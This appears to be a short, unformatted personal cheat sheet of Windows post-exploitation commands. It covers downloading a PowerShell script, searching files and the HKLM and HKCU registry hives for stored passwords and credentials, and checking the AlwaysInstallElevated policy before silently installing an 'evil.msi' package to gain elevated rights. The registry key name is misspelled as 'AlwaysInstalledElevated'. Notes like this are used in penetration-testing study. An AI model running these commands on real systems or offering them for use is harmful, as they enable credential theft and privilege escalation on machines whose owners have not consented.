TO FORMAT

List powershell module dirs:
echo $Env:PSModulePath

Download file:
Invoke-WebRequest http://url-to/file.ps1 -OutFile C:\path\to\file.ps1

Search for passwords:
cmd style: dir /s \*pass\* == \*cred\* == \*vnc\* == \*.config\*
powershell style: findstr /si password \*.xml \*.ini \*.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

MSI REG:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
-> 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
-> 1
=> get an evil.msi
=> msiexec /quiet /qn /i evil.msi


